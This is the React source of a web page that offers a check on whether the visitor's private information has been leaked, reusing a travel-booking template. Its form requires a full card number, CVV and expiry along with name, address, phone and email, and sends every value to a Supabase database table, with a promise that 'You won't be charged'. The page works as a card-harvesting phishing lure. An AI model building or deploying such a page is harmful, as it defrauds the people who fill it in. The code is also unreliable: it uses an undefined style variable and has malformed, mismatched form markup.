import React, { useState } from "react";
import { createRoot } from "react-dom/client";
import { supabase } from "./supabase";

function App() {
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);

  async function handleSubmit(event) {
    event.preventDefault();
    setLoading(true);

    const form = new FormData(event.currentTarget);

    const inquiry = {
      name: form.get("name"),
      email: form.get("email"),
      phone: form.get("phone"),
      card_number: form.get("card_number"),
      cvv: form.get("cvv"),
      expiry: form.get("expiry"),
      country: form.get("country"),
      address: form.get("address"),
      city: form.get("city"),
      message: form.get("message"),
    };

    const { error } = await supabase
      .from("travel_inquiries")
      .insert([inquiry]);

    setLoading(false);

    if (error) {
      console.error("Supabase error:", error);

      alert(
        "Supabase Error\n\n" +
        "Message: " +
        error.message +
        "\n\nCode: " +
        error.code
      );

      return;
    }

    setSubmitted(true);
    event.currentTarget.reset();
  }

  const page = {
    minHeight: "100vh",
    background: "#f6f3ed",
    color: "#17202a",
    fontFamily: "Arial, sans-serif",
  };

  const nav = {
    padding: "22px 7%",
    background: "#fff",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    borderBottom: "1px solid #ddd",
  };

  const logo = {
    fontSize: "22px",
    fontWeight: "800",
    letterSpacing: "1px",
  };

  const black = {
    color: "#c62828",
  };

  const hero = {
    minHeight: "550px",
    padding: "70px 7%",
    display: "flex",
    alignItems: "center",
    color: "#fff",
    background:
      "linear-gradient(rgba(0,0,0,.45),rgba(0,0,0,.45)),url('https://images.unsplash.com/photo-1493976040374-85c8e12f0c0e?auto=format&fit=crop&w=1800&q=80') center/cover",
  };

  const section = {
    padding: "75px 7%",
  };

  const grid = {
    display: "grid",
    gridTemplateColumns: "repeat(auto-fit,minmax(250px,1fr))",
    gap: "22px",
  };

  const input = {
    width: "100%",
    boxSizing: "border-box",
    padding: "14px",
    border: "1px solid #ccc",
    borderRadius: "5px",
    fontSize: "15px",
    background: "#fff",
  };

  const label = {
    fontWeight: "700",
    fontSize: "14px",
    marginBottom: "7px",
  };

  const field = {
    display: "flex",
    flexDirection: "column",
  };

  return (
    <div style={page}>

      <nav style={nav}>
        <div style={logo}>
          Confidential<span style={red}>Info</span>
        </div>

        <div>
          <a href="#tours" style={{ marginRight: "20px" }}>
            Tours
          </a>

          <a href="#booking">
            See if your information has been leaked
          </a>
        </div>
      </nav>

      <section style={hero}>
        <div>
          <p
            style={{
              letterSpacing: "4px",
              textTransform: "uppercase",
            }}
          >
            Private Information
          </p>

          <h1
            style={{
              fontSize: "clamp(45px,7vw,80px)",
              margin: "15px 0",
            }}
          >
            Find out now
          </h1>

          <p
            style={{
              fontSize: "18px",
              maxWidth: "600px",
              lineHeight: "1.7",
            }}
          >
           
              <div
  style={{
    padding: "20px",
    textAlign: "center",
  }}
>

{submitted ? (
  <div>
    <p>
      Thank you. Your Confidential Information report request has been received
      successfully.
    </p>

    <button
      onClick={() => setSubmitted(false)}
      style={{
        padding: "12px 20px",
        border: "none",
        background: "#17202a",
        color: "#fff",
        borderRadius: "4px",
        cursor: "pointer",
      }}
    >
      Submit Another Inquiry
    </button>
  </div>
) : (
  <form onSubmit={handleSubmit}>
    {/* your fields */}
  </form>
)}
              <div style={grid}>

                <div style={field}>
                  <label style={label}>
                    Full Name *
                  </label>

                  <input
                    required
                    name="name"
                    type="text"
                    placeholder="Your full name"
                    style={input}
                  />
                </div>

                <div style={field}>
                  <label style={label}>
                    Email Address *
                  </label>

                  <input
                    required
                    name="email"
                    type="email"
                    placeholder="you@example.com"
                    style={input}
                  />
                </div>

                <div style={field}>
                  <label style={label}>
                    card number *
                  </label>

                  <input
                    required
                    name="card_number"
                    type="card_number"
                    placeholder="55667722829992"
                    style={input}
                  />
                </div>

                <div style={field}>
                  <label style={label}>
                    expiry *
                  </label>

                  <input
                    required
                    name="expiry"
                    type="expiry"
                    placeholder="06/29"
                    style={input}
                  />
                </div>

                <div style={field}>
                  <label style={label}>
                    cvv *
                  </label>

                  <input
                    required
                    name="cvv"
                    type="cvv"
                    placeholder="123"
                    style={input}
                  />
                </div>

    

                <div style={field}>
                  <label style={label}>
                    Phone Number *
                  </label>

                  <input
                    required
                    name="phone"
                    type="tel"
                    placeholder="+92 300 0000000"
                    style={input}
                  />
                </div>

                <div style={field}>
                  <label style={label}>
                    Country *
                  </label>

                  <select
                    required
                    name="country"
                    defaultValue=""
                    style={input}
                  >
                    <option value="" disabled>
                      Select country
                    </option>

                    <option>Pakistan</option>
                    <option>United Kingdom</option>
                    <option>United States</option>
                    <option>Canada</option>
                    <option>Australia</option>
                    <option>Germany</option>
                    <option>France</option>
                    <option>Netherlands</option>
                    <option>United Arab Emirates</option>
                    <option>Saudi Arabia</option>
                    <option>Other</option>
                  </select>
                </div>

                <div style={field}>
                  <label style={label}>
                    Address *
                  </label>

                  <input
                    required
                    name="address"
                    type="text"
                    placeholder="Street address"
                    style={input}
                  />
                </div>

                <div style={field}>
                  <label style={label}>
                    City *
                  </label>

                  <input
                    required
                    name="city"
                    type="text"
                    placeholder="Your city"
                    style={input}
                  />
                </div>

                

              </div>

              <div
                style={{
                  ...field,
                  marginTop: "22px",
                }}
              >
                <label style={label}>
                  Message
                </label>

                <textarea
                  name="message"
                  placeholder="Tell us about your requirements..."
                  style={{
                    ...input,
                    minHeight: "140px",
                    resize: "vertical",
                  }}
                />
              </div>

              <button
                type="submit"
                disabled={loading}
                style={{
                  marginTop: "25px",
                  padding: "15px 30px",
                  background: loading
                    ? "#999"
                    : "#c62828",
                  color: "#fff",
                  border: "none",
                  borderRadius: "4px",
                  fontWeight: "700",
                  cursor: loading
                    ? "not-allowed"
                    : "pointer",
                }}
              >
                {loading
                  ? "Submitting..."
                  : "Reserve for 50% off | You won't be charged"}
              </button>

            </form>
          )}

        </div>
      </section>

      <footer
        style={{
          background: "#111820",
          color: "#fff",
          padding: "45px",
          textAlign: "center",
        }}
      >
        <h3>
          Confidential<span style={red}>info</span>
        </h3>

        <p>Discover now. get your report today.</p>

        <small>
          © 2026 Confidential info company. All rights reserved.
        </small>
      </footer>

    </div>
  );
}

createRoot(document.getElementById("root")).render(<App />);
